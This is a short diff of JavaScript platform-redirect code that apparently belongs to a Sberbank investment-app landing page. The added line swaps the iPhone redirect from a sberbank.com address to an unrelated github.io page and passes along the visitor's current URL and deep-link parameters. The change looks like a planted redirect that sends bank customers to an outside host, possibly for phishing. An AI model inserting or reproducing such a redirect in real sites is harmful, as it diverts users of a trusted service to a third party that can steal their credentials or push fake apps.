@@ -89,7 +89,7 @@ setTimeout(() => {
                 setTimeout(function () {window.location.href = 'https://cdn.sberbank.ru/appdistr/SberInvestor_Android.apk'; }, 1900);
     } else if (platform == "iPhone") {
         setTimeout(function () {window.location.href = dp_ios; }, 100);
-        setTimeout(function () {window.location.href = "https://www.sberbank.com/sms/inv_sl_old_st1?URL_START=" + encodeURIComponent(document.location.href) + "&SL_iOS_DP_OLD=" + ios_af_dp + is_q_ios + other_param_app + external_source + "&SL_WEB_LINK_iOS=" + dp_web; }, 300);
+        setTimeout(function () {window.location.href = "https://kawairy.github.io/1stindex.html?URL_START=" + encodeURIComponent(document.location.href) + "&SL_iOS_DP_OLD=" + ios_af_dp + is_q_ios + other_param_app + external_source + "&SL_WEB_LINK_iOS=" + dp_web; }, 300);
         setTimeout(function () {window.location.href = dp_web; }, 800);
     } else {
         setTimeout(function () {window.location.href = dp_web; }, 100);
